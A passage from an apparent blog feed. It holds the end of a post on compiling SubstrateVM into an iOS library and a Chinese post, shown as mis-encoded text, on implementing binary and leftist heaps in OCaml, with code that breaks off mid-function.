<div class="wp-block-image"><figure class="aligncenter size-large"><a href="https://www.noisyfox.io/wp-content/uploads/2021/03/image-2.png" target="_blank" rel="noopener"><img loading="lazy" width="613" height="410" src="https://www.noisyfox.io/wp-content/uploads/2021/03/image-2.png" alt="SubstrateVM on iOS - LLVM compiled with HomeFinderFeature enabled" class="wp-image-820" srcset="https://www.noisyfox.io/wp-content/uploads/2021/03/image-2.png 613w, https://www.noisyfox.io/wp-content/uploads/2021/03/image-2-300x201.png 300w" sizes="(max-width: 613px) 100vw, 613px" /></a><figcaption>LLVM compiled with HomeFinderFeature enabled</figcaption></figure></div>



<p>Ok. Now let&#8217;s try compile it into a library by adding <code data-enlighter-language="shell" class="EnlighterJSRAW">--shared</code> at the end:</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><a href="https://www.noisyfox.io/wp-content/uploads/2021/03/image-3.png" target="_blank" rel="noopener"><img loading="lazy" width="618" height="771" src="https://www.noisyfox.io/wp-content/uploads/2021/03/image-3.png" alt="SubstrateVM on iOS - compile into shared library" class="wp-image-825" srcset="https://www.noisyfox.io/wp-content/uploads/2021/03/image-3.png 618w, https://www.noisyfox.io/wp-content/uploads/2021/03/image-3-240x300.png 240w" sizes="(max-width: 618px) 100vw, 618px" /></a><figcaption>Compile into shared library</figcaption></figure></div>



<p>As you can see, a dynamic library has been generated (&#8220;test.dylib&#8221;), with few C header files. By looking at the content of the &#8220;test.h&#8221;, I found a function <code data-enlighter-language="c" class="EnlighterJSRAW">int run_main(int argc, char** argv);</code> which is pretty clear to me that I need to call this function in my iOS app to execute the Java main function, similar to the <code data-enlighter-language="c" class="EnlighterJSRAW">moevm(argc, argv);</code> we called from <a href="https://github.com/multi-os-engine-community/moe-samples-java/blob/69f97cb7743c0d19debfb7f85d64ab7984c892e5/Calculator/ios/xcode/ios/main.cpp#L4" target="_blank" rel="noreferrer noopener">the main function in MOE</a>.</p>



<p>Then what&#8217;s next is pretty clear: I need to somehow make that dynamic library into a static library so we could link it in iOS project.</p>



<hr class="wp-block-separator"/>



<h2>Or Maybe an Object File Instead&#8230;?</h2>



<p>TBC</p>
<p><a rel="nofollow" href="https://www.noisyfox.io/substratevm-on-ios.html">SubstrateVM on iOS</a>ï¼Œé¦–å‘äº<a rel="nofollow" href="https://www.noisyfox.io">ç‹ç‹¸çš„å°å°çª</a>ã€‚</p>]]></content>
        <author>
            <name><![CDATA[ç‹ç‹¸çš„å°å°çª]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.creedowl.com/posts/ocaml-heap/</id>
        <title><![CDATA[Ocaml Heap]]></title>
        <updated>2021-03-03T07:10:56+08:00</updated>
        <link href="https://blog.creedowl.com/posts/ocaml-heap/"/>
        <content type="text/html" src="https://blog.creedowl.com/posts/ocaml-heap/"><![CDATA[<h1 id="ç®€ä»‹">ç®€ä»‹</h1>
<p>æœ¬æ¬¡è¯¾è®¾æˆ‘å®ç°çš„æ•°æ®ç»“æ„æ˜¯<strong>å †ï¼ˆheap)</strong>ï¼Œå †æ˜¯ä¸€ç§éå¸¸é‡è¦çš„æ•°æ®ç»“æ„ï¼Œåˆ†ä¸ºå¤§é¡¶å †å’Œå°é¡¶å †ï¼Œå¯ä»¥å¿«é€Ÿåœ°è·å–å…¶ä¸­ä¼˜å…ˆçº§æœ€é«˜çš„å…ƒç´ ã€‚è‹¥æ˜¯æ»¡è¶³ä»¥ä¸‹ç‰¹æ€§ï¼Œå³å¯ç§°ä¸ºå †ï¼šâ€œç»™å®šå †ä¸­ä»»æ„èŠ‚ç‚¹På’ŒCï¼Œè‹¥Pæ˜¯Cçš„æ¯èŠ‚ç‚¹ï¼Œé‚£ä¹ˆPçš„å€¼ä¼šå°äºç­‰äºï¼ˆæˆ–å¤§äºç­‰äºï¼‰Cçš„å€¼â€ã€‚è‹¥æ¯èŠ‚ç‚¹çš„å€¼æ’å°äºç­‰äºå­èŠ‚ç‚¹çš„å€¼ï¼Œæ­¤å †ç§°ä¸ºæœ€å°å †ï¼ˆmin heapï¼‰ï¼›åä¹‹ï¼Œè‹¥æ¯èŠ‚ç‚¹çš„å€¼æ’å¤§äºç­‰äºå­èŠ‚ç‚¹çš„å€¼ï¼Œæ­¤å †ç§°ä¸ºæœ€å¤§å †ï¼ˆmax heapï¼‰ã€‚æ‰€ä»¥å †åˆç§°ä½œä¼˜å…ˆé˜Ÿåˆ—ã€‚</p>
<h1 id="åŸç†">åŸç†</h1>
<h2 id="å®Œå…¨äºŒå‰æ ‘">å®Œå…¨äºŒå‰æ ‘</h2>
<p>å †çš„å®ç°æ–¹å¼é€šå¸¸æ˜¯å®Œå…¨äºŒå‰æ ‘ï¼Œé‡‡ç”¨æ•°ç»„è¿›è¡Œæ¨¡æ‹Ÿã€‚å®Œå…¨äºŒå‰æ ‘çš„ç‰¹ç‚¹æ˜¯è¾ƒä¸ºå¯¹ç§°ï¼ŒæŸ¥æ‰¾æ—¶æ—¶é—´å¤æ‚åº¦è¾ƒä¸ºç¨³å®šï¼Œå¯ä»¥é€šè¿‡æ•°ç»„è¿›è¡Œæ¨¡æ‹Ÿï¼Œè€Œä¸éœ€è¦å®é™…æ„å»ºä¸€æ£µäºŒå‰æ ‘ã€‚</p>
<p>ä»¥æ•°ç»„ <code>[1, 2, 3, 4, 5, 6, 7]</code> ä¸ºä¾‹ï¼Œå¯ä»¥æ„å»ºå‡ºå¦‚ä¸‹ä¸€æ£µå®Œå…¨äºŒå‰æ ‘ã€‚</p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/blogUntitled.png" alt="p1"></p>
<p>å¯¹äºæ¯ä¸ªèŠ‚ç‚¹éƒ½æ»¡è¶³å€¼å¤§äºçˆ¶èŠ‚ç‚¹ï¼Œæ‰€ä»¥è¿™æ˜¯ä¸€ä¸ªå°é¡¶å †ã€‚å¯¹æ¯”æ•°ç»„å’ŒäºŒå‰æ ‘ï¼Œå¯ä»¥å‘ç°ï¼š</p>
<ol>
<li>å¯¹äºèŠ‚ç‚¹ <code>i</code> ï¼Œå®ƒçš„ä¸¤ä¸ªå­èŠ‚ç‚¹åœ¨æ•°ç»„ä¸­çš„ç´¢å¼•ä¸º <code>2*i</code> å’Œ <code>2*i+1</code></li>
<li>ä¸¤ä¸ªå­èŠ‚ç‚¹çš„å¤§å°å¯¹äºå †çš„æ€§è´¨å¹¶æ²¡æœ‰å½±å“ï¼Œè¿™ç‚¹å’ŒäºŒå‰æœç´¢æ ‘ä¸ä¸€æ ·</li>
</ol>
<p>å…¶ä¸­çš„æ ¸å¿ƒæ“ä½œæ˜¯ <code>shiftUp</code> å’Œ <code>shiftDown</code></p>
<p>åˆ†æå…¶æ—¶é—´å¤æ‚åº¦ï¼Œæœ‰ï¼š</p>
<ul>
<li>è·å–å †é¡¶å…ƒç´ ï¼š$O(1)$</li>
<li>æ’å…¥å…ƒç´ ï¼š$O(logn)$</li>
<li>åˆ é™¤å…ƒç´ ï¼š$O(logn)$</li>
<li>åˆå¹¶å †ï¼š$O(n)$</li>
</ul>
<p>ä¸è¿‡é‡‡ç”¨å®Œå…¨äºŒå‰æ ‘å¹¶ä¸èƒ½æ–¹ä¾¿åœ°è¿›è¡Œåˆå¹¶æ“ä½œï¼Œéœ€è¦è½¬æ¢æˆå¯¹ä¸€ä¸ªå †çš„æ’å…¥æ“ä½œ</p>
<hr>
<p>ä½†åœ¨å‡½æ•°å¼è¯­è¨€ä¸­è¦å¦‚ä½•å®ç°ä¸€ä¸ªå †å‘¢ï¼Ÿå¯¹äºçº¯å‡½æ•°å¼è¯­è¨€ï¼Œæ˜¯ä¸å…è®¸æœ‰å‰¯ä½œç”¨çš„ã€‚è™½ç„¶ <code>Ocaml</code> æ”¯æŒå‘½ä»¤å¼æ“ä½œï¼Œä¹Ÿæ”¯æŒä¼ ç»Ÿçš„æ•°ç»„ï¼Œä½†ä¾ç„¶é‡‡ç”¨æ•°ç»„æ¨¡æ‹Ÿçš„è¯å’Œæ™®é€šçš„å‘½ä»¤å¼è¯­è¨€å°±æ²¡æœ‰å¤ªå¤šåŒºåˆ«ï¼Œè€Œä¸”ä¼šäº§ç”Ÿå‰¯ä½œç”¨ï¼Œè¿™æ˜¯ä¸æ¨èçš„ã€‚é‚£ä¹ˆå¦‚æœç”¨ <code>List</code> æ¥æ¨¡æ‹Ÿæ•°ç»„æ“ä½œå‘¢ï¼Ÿ</p>
<p><code>Ocaml</code> ä¸­çš„ <code>List</code> æ˜¯é€šè¿‡é“¾è¡¨å®ç°çš„ï¼Œè¿™å°±æ„å‘³ç€ <code>List</code> åªèƒ½è¿›è¡Œé¡ºåºè®¿é—®ï¼Œæ— æ³•éšæœºè®¿é—®ï¼Œä¹Ÿå°±æ— æ³•åƒä¸Šé¢é‚£æ ·æ„å»ºå‡ºä¸€ä¸ªè™šæ‹Ÿçš„æ ‘å½¢ç»“æ„ï¼Œè€Œè¦å…¨éƒ¨è½¬æ¢æˆéå†æ“ä½œã€‚è™½ç„¶å¯ä»¥é€šè¿‡è®¡ç®—å’Œè®°å½•ç¡®å®šèŠ‚ç‚¹çš„ä½ç½®ï¼Œä½†ä¼šå¯¼è‡´è®¿é—®çš„æ—¶é—´å¤æ‚æ€§å¤§å¤§æé«˜ã€‚è¿˜æœ‰åˆ«çš„åŠæ³•å—ï¼Ÿ</p>
<p>æ—¢ç„¶ç”¨æ•°ç»„æ¨¡æ‹Ÿå®Œå…¨äºŒå‰æ ‘çš„æ–¹æ³•åœ¨å‡½æ•°å¼è¯­è¨€ä¸­æœ‰å¾ˆå¤§çš„é™åˆ¶ï¼Œé‚£æˆ‘ä»¬æ‰‹åŠ¨æ¨¡æ‹Ÿä¸€æ£µäºŒå‰æ ‘è¯•è¯•ã€‚æˆ‘ä»¬å¯ä»¥å®šä¹‰å‡ºä»¥ä¸‹çš„æ•°æ®ç»“æ„ï¼š</p>
<div class="highlight"><pre class="chroma"><code class="language-ocaml" data-lang="ocaml"><span class="k">type</span> <span class="k">&#39;</span><span class="n">a</span> <span class="n">heap</span> <span class="o">=</span> 
	<span class="o">|</span> <span class="nc">Leaf</span>
	<span class="o">|</span> <span class="nc">Node</span> <span class="k">of</span> <span class="k">&#39;</span><span class="n">a</span> <span class="o">*</span> <span class="k">&#39;</span><span class="n">a</span> <span class="n">heap</span> <span class="o">*</span> <span class="k">&#39;</span><span class="n">a</span> <span class="n">heap</span>
</code></pre></div><p>è¯¥ç»“æ„å‚è€ƒäº†ä¹¦ä¸Šçš„å†…å®¹ï¼Œä¸€ä¸ªèŠ‚ç‚¹ç”±è‡ªèº«çš„å€¼å’Œå·¦å³å­èŠ‚ç‚¹æ„æˆï¼Œç©ºèŠ‚ç‚¹ä¸ºå¶å­èŠ‚ç‚¹ã€‚</p>
<p>å¯¹äºæ’å…¥æ“ä½œï¼Œä¼ ç»Ÿçš„æ•°ç»„æ¨¡æ‹Ÿæ–¹å¼å°†å…ƒç´ æ’å…¥æ•°ç»„å°¾éƒ¨ï¼Œå†è°ƒç”¨ <code>shiftUp</code> æ“ä½œå°†å…ƒç´ ç§»åŠ¨åˆ°æ­£ç¡®çš„ä½ç½®ï¼Œå¦‚å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/blog/1614757139001-Untitled%201.png" alt="p2"></p>
<p>ä½†åœ¨æ ‘çŠ¶ç»“æ„ä¸­ï¼Œæˆ‘ä»¬å¾ˆéš¾æ‰¾åˆ°æœ€åä¸€ä¸ªå…ƒç´ çš„ä½ç½®ï¼Œæˆ–è€…è¯´æ—¶é—´å¤æ‚åº¦å¤ªé«˜ï¼Œä¸å…·å¤‡å¯è¡Œæ€§ï¼Œä¹Ÿå°±æ— æ³•é‡‡ç”¨ <code>shiftUp</code> çš„æ€æƒ³ã€‚è€Œæˆ‘ä»¬çš„æ ‘ç»“æ„åªä¿å­˜äº†æ ¹èŠ‚ç‚¹çš„ä½ç½®ï¼Œä¹Ÿå°±æ„å‘³ç€åªèƒ½è‡ªé¡¶å‘ä¸‹æƒ³æƒ³åŠæ³•ã€‚</p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/blog/1614757187865-Untitled%202.png" alt="p3"></p>
<p>é¦–å…ˆæ¯”è¾ƒ 1 å’Œ 4 ï¼Œ1 æ¯” 4 å°ï¼Œåº”è¯¥ç»§ç»­å‘ä¸‹ï¼Œä½†åº”è¯¥èµ°å·¦è¾¹è¿˜æ˜¯å³è¾¹å‘¢ï¼Ÿå †èƒ½ä¿æŒé«˜æ•ˆæ€§çš„åŸå› ä¹‹ä¸€å°±æ˜¯ç»“æ„æ¯”è¾ƒå¯¹ç§°ï¼Œå³å·¦å³å­æ ‘çš„æ·±åº¦å¤§è‡´ç›¸ç­‰ã€‚å¿…é¡»è¦æ‰¾åˆ°ä¸€ä¸ªè§„åˆ™æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p>
<p>å †çš„å¦ä¸€ä¸ªé‡è¦æ“ä½œæ˜¯åˆ é™¤ï¼Œå³åˆ é™¤æœ€é¡¶ç«¯èŠ‚ç‚¹ã€‚è¿™æ—¶æˆ‘ä»¬å‘ç°å¦‚æœåˆ æ‰äº†æ ¹èŠ‚ç‚¹ï¼Œæˆ‘ä»¬ä¼šå¾—åˆ°ä¸¤ä¸ªäºŒå‰æ ‘ï¼š</p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/blog/1614757208893-Untitled%203.png" alt="p4"></p>
<p>åœ¨æ•°ç»„æ¨¡æ‹Ÿçš„æ–¹å¼ä¸­æˆ‘ä»¬å°†æ•°ç»„çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼ˆä¹Ÿå°±æ˜¯å®Œå…¨äºŒå‰æ ‘çš„æœ€åä¸€ä¸ªèŠ‚ç‚¹ï¼‰ç§»åŠ¨åˆ°åŸæœ¬æ ¹èŠ‚ç‚¹çš„ä¸ºæ­¢ï¼Œå†é‡‡ç”¨ <code>shiftDown</code> æ“ä½œå°†å®ƒç§»åŠ¨åˆ°æ­£ç¡®çš„ä½ç½®ã€‚ä½†åŒä¸Šé¢çš„é—®é¢˜ä¸€æ ·ï¼Œæ— æ³•å¿«é€Ÿå®šä½åˆ°æœ€åä¸€ä¸ªèŠ‚ç‚¹ï¼Œå› æ­¤é—®é¢˜å˜æˆäº†å¦‚ä½•åˆå¹¶ä¸¤ä¸ªå †ã€‚è¿™æ—¶å†çœ‹æ’å…¥æ“ä½œï¼Œå‘ç°ä¹Ÿå¯ä»¥å½“æˆåˆå¹¶å †è§£å†³ï¼Œå³å°†ç›®æ ‡å †å’Œç”±å¾…æ’å…¥å…ƒç´ æ„æˆçš„åªæœ‰ä¸€ä¸ªèŠ‚ç‚¹çš„å †è¿›è¡Œåˆå¹¶ã€‚å¯è§å †çš„æ ¸å¿ƒæ“ä½œéƒ½è½¬æ¢æˆäº†å †åˆå¹¶ï¼Œè¿™å°±éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥é«˜æ•ˆåœ°è¿›è¡Œå †åˆå¹¶çš„æ–¹æ³•ã€‚</p>
<h2 id="å·¦åæ ‘">å·¦åæ ‘</h2>
<p>æœç´¢åå‘ç°ï¼Œè™½ç„¶å¤§éƒ¨åˆ†ç®—æ³•æ•™ç¨‹å’Œä¹¦ä¸­å †éƒ½æ˜¯é‡‡ç”¨æ•°ç»„æ¨¡æ‹Ÿå®Œå…¨äºŒå‰æ ‘ï¼Œä½†ä¹Ÿæœ‰å…¶å®ƒæ•°æ®ç»“æ„å¯ä»¥å®ç°å †ï¼Œå°±æ˜¯å·¦åæ ‘ã€‚æŸ¥çœ‹ç»´åŸºç™¾ç§‘ä¸­çš„å®šä¹‰ï¼š</p>
<blockquote>
<p>å·¦åæ ‘æ˜¯ä¸€ç§å¯å¹¶å †çš„å®ç°ã€‚å·¦åæ ‘æ˜¯ä¸€æ£µäºŒå‰æ ‘ï¼Œå®ƒçš„èŠ‚ç‚¹é™¤äº†å’ŒäºŒå‰æ ‘çš„èŠ‚ç‚¹ä¸€æ ·å…·æœ‰å·¦å³å­æ ‘æŒ‡é’ˆï¼ˆleft, rightï¼‰å¤–ï¼Œè¿˜æœ‰ä¸¤ä¸ªå±æ€§ï¼š é”®å€¼å’Œè·ç¦»ï¼ˆè‹±æ–‡æ–‡çŒ®ä¸­ç§°ä¸ºs-valueï¼‰ã€‚é”®å€¼ç”¨äºæ¯”è¾ƒèŠ‚ç‚¹çš„å¤§å°ã€‚è·ç¦»çš„å®šä¹‰å¦‚ä¸‹ï¼š
å½“ä¸”ä»…å½“èŠ‚ç‚¹ i çš„å·¦å­æ ‘æˆ–å³å­æ ‘ä¸ºç©ºæ—¶ï¼ŒèŠ‚ç‚¹è¢«ç§°ä½œå¤–èŠ‚ç‚¹ï¼ˆå®é™…ä¸Šä¿å­˜åœ¨äºŒå‰æ ‘ä¸­çš„èŠ‚ç‚¹éƒ½æ˜¯å†…èŠ‚ç‚¹ï¼Œå¤–èŠ‚ç‚¹æ˜¯é€»è¾‘ä¸Šå­˜åœ¨è€Œæ— éœ€ä¿å­˜ã€‚æŠŠä¸€é¢—äºŒå‰æ ‘è¡¥ä¸Šå…¨éƒ¨çš„å¤–èŠ‚ç‚¹ï¼Œåˆ™ç§°ä¸ºextended binary treeï¼‰ã€‚èŠ‚ç‚¹içš„è·ç¦»æ˜¯èŠ‚ç‚¹ i åˆ°å®ƒçš„åä»£ä¸­çš„æœ€è¿‘çš„å¤–èŠ‚ç‚¹æ‰€ç»è¿‡çš„è¾¹æ•°ã€‚ç‰¹åˆ«çš„ï¼Œå¦‚æœèŠ‚ç‚¹ i æœ¬èº«æ˜¯å¤–èŠ‚ç‚¹ï¼Œåˆ™å®ƒçš„è·ç¦»ä¸º0;è€Œç©ºèŠ‚ç‚¹çš„è·ç¦»è§„å®šä¸º -1ã€‚</p>
</blockquote>
<p>å…‰çœ‹å®šä¹‰æ¯”è¾ƒå¤æ‚ï¼Œä½†å…¶å®å¾ˆç®€å•ï¼Œåªéœ€è¦åœ¨ä¸Šé¢å®šä¹‰çš„æ ‘ä¸­åŠ å…¥ä¸€ä¸ªè·ç¦»ï¼ˆrankï¼‰å³å¯ï¼Œä¸€ä¸ªèŠ‚ç‚¹è·ç¦»çš„å€¼ä¸ºåˆ°æœ€å³å¶å­èŠ‚ç‚¹çš„é•¿åº¦ï¼Œå¦‚å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/blog/1614757222212-Untitled%204.png" alt="p5"></p>
<p>rank æ˜¯ç”¨æ¥æ¯”è¾ƒå·¦å³å­æ ‘çš„é•¿åº¦çš„ï¼Œåœ¨å·¦åæ ‘ä¸­ï¼Œ<strong>æ‰€æœ‰èŠ‚ç‚¹çš„å·¦å­æ ‘ rank å€¼ä¸€å®šå¤§äºç­‰äºå³å­æ ‘</strong>ã€‚å› æ­¤æ¯æ¬¡è¿›è¡Œåˆå¹¶æ“ä½œæ—¶æˆ‘ä»¬é€‰æ‹©å³å­æ ‘ï¼Œé‡å¤è¿›è¡Œç›´åˆ°å¶å­èŠ‚ç‚¹æˆ–æ­£ç¡®çš„ä½ç½®ï¼Œæœ€åæ›´æ–°è·¯å¾„ä¸Šçš„ rank å€¼ï¼Œå¦‚æœå‡ºç°å³å­æ ‘çš„ rank å€¼å¤§äºå·¦å­æ ‘ï¼Œåˆ™äº¤æ¢å·¦å³å­æ ‘ä»¥ä¿è¯å·¦åæ ‘çš„å®šä¹‰æˆç«‹ã€‚</p>
<p>ä½œä¸ºå·¦åæ ‘çš„æ ¸å¿ƒæ“ä½œï¼Œåˆå¹¶ï¼ˆmergeï¼‰æ“ä½œçš„æµç¨‹å¦‚ä¸‹ï¼š</p>
<ol>
<li>åˆå¹¶ <code>t1</code> ï¼Œ<code>t2</code> ä¸¤ä¸ªæ ‘ <code>merge t1 t2</code></li>
<li>æ¯”è¾ƒä¸¤ä¸ªæ ‘æ ¹èŠ‚ç‚¹çš„å€¼ï¼Œå¦‚æœ <code>v1 &lt; v2</code> åˆ™äº¤æ¢ä¸¤ä¸ªæ ‘ï¼ˆå³ <code>merge t2 t1</code> ï¼‰ï¼Œè¿™æ ·åšçš„ç›®çš„æ˜¯ä¿è¯å·¦è¾¹æ ‘çš„å€¼å°äºå³è¾¹ï¼Œä¾¿äºæ“ä½œã€‚å®é™…æ¯”è¾ƒæ“ä½œæ˜¯é€šè¿‡å‡½å­ä¸­çš„ <code>compare</code> å‡½æ•°è¿›è¡Œï¼Œå¯ä»¥æ ¹æ®è¯¥å‡½æ•°è®¾ç½®å¤§é¡¶å †æˆ–å°é¡¶å †</li>
<li>ç”±äºå·¦è¾¹æ ‘ï¼ˆ <code>t1</code> ï¼‰æ ¹èŠ‚ç‚¹çš„å€¼å°äºå³è¾¹æ ‘ï¼ˆ <code>t2</code> ï¼‰ï¼Œ<code>v1</code> ä¿æŒä¸å˜ä½œä¸ºæ–°çš„æ ¹èŠ‚ç‚¹</li>
<li>ç”±äº <code>t1</code> çš„å³å­æ ‘ <code>r</code> ä¸€å®šæ˜¯æœ€çŸ­çš„ï¼Œå¼€å§‹åˆå¹¶ <code>r</code> å’Œ <code>t2</code> ï¼ˆå³ <code>merge r t2</code> ï¼‰</li>
<li>å½“ä»»ä¸€å­æ ‘æ˜¯å¶å­èŠ‚ç‚¹æ—¶ï¼Œåªéœ€è¦ç›´æ¥è¿”å›å¦ä¸€ä¸ªå­æ ‘ï¼Œå¹¶å¼€å§‹å‘ä¸Šæ›´æ–°æ¯ä¸ªèŠ‚ç‚¹çš„ <code>rank</code> å€¼</li>
<li>æ›´æ–°å®Œæ¯•åè¿˜è¦æ¯”è¾ƒå·¦å³å­æ ‘çš„ <code>rank</code> å€¼ä»¥ç¡®å®šæ˜¯å¦éœ€è¦äº¤æ¢å·¦å³å­æ ‘</li>
</ol>
<p>çœ‹ä¸€ä¸ªåˆå¹¶å­æ ‘çš„ä¾‹å­ï¼š</p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/blog/1614757235831-Untitled%205.png" alt="p6"></p>
<p>åˆ†æå…¶æ—¶é—´å¤æ‚åº¦ï¼Œæœ‰ï¼š</p>
<ul>
<li>è·å–å †é¡¶å…ƒç´ ï¼š$O(1)$</li>
<li>æ’å…¥å…ƒç´ ï¼š$O(logn)$</li>
<li>åˆ é™¤å…ƒç´ ï¼š$O(logn)$</li>
<li>åˆå¹¶å †ï¼š$O(logn)$</li>
</ul>
<h1 id="ä»£ç ">ä»£ç </h1>
<h2 id="å®Œå…¨äºŒå‰æ ‘-1">å®Œå…¨äºŒå‰æ ‘</h2>
<p>è¿™éƒ¨åˆ†ä»£ç æ˜¯æˆ‘ä¸€å¼€å§‹ç ”ç©¶å­¦ä¹ æ—¶å†™çš„æµ‹è¯•ä»£ç ï¼Œæ¯”è¾ƒæ··ä¹±ï¼Œä¹Ÿé‡‡ç”¨äº†å¾ˆå¤šå‘½ä»¤å¼è¯­è¨€çš„æ€ç»´ï¼Œæ¯”å¦‚æœ‰å¤§é‡çš„å‰¯ä½œç”¨ï¼Œå¯¹å¯¹è±¡çš„æ“ä½œéƒ½æ˜¯åœ¨ä¸€ä¸ªå¯¹è±¡æœ¬èº«ç­‰ã€‚è¿™é‡Œä¿ç•™åœ¨è¿™æ¥å’Œä¸‹é¢çº¯å‡½æ•°å¼çš„å†™æ³•åšä¸€ä¸ªå¯¹æ¯”</p>
<p><code>binary_heap.ml</code></p>
<div class="highlight"><pre class="chroma"><code class="language-ocaml" data-lang="ocaml"><span class="c">(* Input signature of the functor *)</span>
<span class="k">module</span> <span class="k">type</span> <span class="nc">OrderedType</span> <span class="o">=</span> <span class="k">sig</span>
  <span class="c">(* the type of the heap elements *)</span>
  <span class="k">type</span> <span class="n">t</span>

  <span class="c">(* compare function used to determine the order of elements *)</span>
  <span class="k">val</span> <span class="n">compare</span> <span class="o">:</span> <span class="n">t</span> <span class="o">-&gt;</span> <span class="n">t</span> <span class="o">-&gt;</span> <span class="kt">int</span>
<span class="k">end</span>

<span class="k">module</span> <span class="nc">Make</span> <span class="o">(</span><span class="nc">Ord</span> <span class="o">:</span> <span class="nc">OrderedType</span><span class="o">)</span> <span class="o">=</span> <span class="k">struct</span>
  <span class="k">type</span> <span class="n">elt</span> <span class="o">=</span> <span class="nn">Ord</span><span class="p">.</span><span class="n">t</span>

  <span class="k">type</span> <span class="n">tree</span> <span class="o">=</span> <span class="o">{</span> <span class="k">mutable</span> <span class="n">elements</span> <span class="o">:</span> <span class="n">elt</span> <span class="kt">array</span><span class="o">;</span> <span class="k">mutable</span> <span class="n">size</span> <span class="o">:</span> <span class="kt">int</span> <span class="o">}</span>

  <span class="k">let</span> <span class="n">create</span> <span class="n">n</span> <span class="n">default</span> <span class="o">=</span> <span class="o">{</span> <span class="n">size</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span> <span class="n">elements</span> <span class="o">=</span> <span class="nn">Array</span><span class="p">.</span><span class="n">make</span> <span class="n">n</span> <span class="n">default</span> <span class="o">}</span>

  <span class="k">let</span> <span class="n">insert</span> <span class="n">v</span> <span class="n">t</span> <span class="o">=</span>
    <span class="k">let</span> <span class="n">d</span> <span class="o">=</span> <span class="n">t</span><span class="o">.</span><span class="n">elements</span> <span class="k">in</span>
    <span class="k">let</span> <span class="k">rec</span> <span class="n">shiftUp</span> <span class="n">i</span> <span class="o">=</span>
      <span class="k">let</span> <span class="n">fi</span> <span class="o">=</span> <span class="o">(</span><span class="n">i</span> <span class="o">-</span> <span class="n">1</span><span class="o">)</span> <span class="o">/</span> <span class="n">2</span> <span class="k">in</span>
      <span class="k">if</span> <span class="n">i</span> <span class="o">&gt;</span> <span class="n">0</span> <span class="o">&amp;&amp;</span> <span class="nn">Ord</span><span class="p">.</span><span class="n">compare</span> <span class="n">d</span><span class="o">.(</span><span class="n">fi</span><span class="o">)</span> <span class="n">v</span> <span class="o">&gt;</span> <span class="n">0</span> <span class="k">then</span> <span class="o">(</span>
        <span class="n">d</span><span class="o">.(</span><span class="n">i</span><span class="o">)</span> <span class="o">&lt;-</span> <span class="n">d</span><span class="o">.(</span><span class="n">fi</span><span class="o">);</span>
        <span class="n">shiftUp</span> <span class="n">fi</span> <span class="o">)</span>
      <span class="k">else</span> <span class="n">d</span><span class="o">.(</span><span class="n">i</span><span class="o">)</span> <span class="o">&lt;-</span> <span class="n">v</span>
    <span class="k">in</span>
    <span class="n">shiftUp</span> <span class="n">t</span><span class="o">.</span><span class="n">size</span><span class="o">;</span>
    <span class="n">t</span><span class="o">.</span><span class="n">size</span> <span class="o">&lt;-</span> <span class="n">t</span><span class="o">.</span><span class="n">size</span> <span class="o">+</span> <span class="n">1</span>

  <span class="k">let</span> <span class="n">deleteTop</span> <span class="n">t</span> <span class="o">=</span>
    <span class="k">if</span> <span class="n">t</span><span class="o">.</span><span class="n">size</span> <span class="o">&lt;=</span> <span class="n">0</span> <span class="k">then</span> <span class="n">failwith</span> <span class="s2">&#34;empty&#34;</span>
    <span class="k">else</span>
      <span class="k">let</span> <span class="n">n</span> <span class="o">=</span> <span class="n">t</span><span class="o">.</span><span class="n">size</span> <span class="o">-</span> <span class="n">1</span> <span class="k">in</span>
      <span class="n">t</span><span class="o">.</span><span class="n">size</span> <span class="o">&lt;-</span> <span class="n">n</span><span class="o">;</span>
      <span class="k">let</span> <span class="n">d</span> <span class="o">=</span> <span class="n">t</span><span class="o">.</span><span class="n">elements</span> <span class="k">in</span>
      <span class="k">let</span> <span class="n">x</span> <span class="o">=</span> <span class="n">d</span><span class="o">.(</span><span class="n">n</span><span class="o">)</span> <span class="k">in</span>
      <span class="k">let</span> <span class="k">rec</span> <span class="n">shiftDown</span> <span class="n">i</span> <span class="o">=</span>
        <span class="k">let</span> <span class="n">ci</span> <span class="o">=</span> <span class="o">(</span><span class="n">2</span> <span class="o">*</span> <span class="n">i</span><span class="o">)</span> <span class="o">+</span> <span class="n">1</span> <span class="k">in</span>
        <span class="k">if</span> <span class="n">ci</span> <span class="o">&lt;</span> <span class="n">n</span> <span class="k">then</span>
          <span class="k">let</span> <span class="n">j</span> <span class="o">=</span>
            <span class="k">let</span> <span class="n">k</span> <span class="o">=</span> <span class="n">ci</span> <span class="o">+</span> <span class="n">1</span> <span class="k">in</span>
            <span class="k">if</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="n">n</span> <span class="o">&amp;&amp;</span> <span class="nn">Ord</span><span class="p">.</span><span class="n">compare</span> <span class="n">d</span><span class="o">.(</span><span class="n">k</span><span class="o">)</span> <span class="n">d</span><span class="o">.(</span><span class="n">ci</span><span class="o">)</span> <span class="o">&lt;</span> <span class="n">0</span> <span class="k">then</span> <span class="n">k</span> <span class="k">else</span> <span class="n">ci</span>
          <span class="k">in</span>
          <span class="k">if</span> <span class="nn">Ord</span><span class="p">.</span><span class="n">compare</span> <span class="n">d</span><span class="o">.(</span><span class="n">j</span><span class="o">)</span> <span class="n">x</span> <span class="o">&lt;</span> <span class="n">0</span> <span class="k">then</span> <span class="o">(</span>
            <span class="n">d</span><span class="o">.(</span><span class="n">i</span><span class="o">)</span> <span class="o">&lt;-</span> <span class="n">d</span><span class="o">.(</span><span class="n">j</span><span class="o">);</span>
            <span class="n">shiftDown</span> <span class="n">j</span> <span class="o">)</span>
          <span class="k">else</span> <span class="n">d</span><span class="o">.(</span><span class="n">i</span><span class="o">)</span> <span class="o">&lt;-</span> <span class="n">x</span>
        <span class="k">else</span> <span class="n">d</span><span class="o">.(</span><span class="n">i</span><span class="o">)</span> <span class="o">&lt;-</span> <span class="n">x</span>
      <span class="k">in</span>
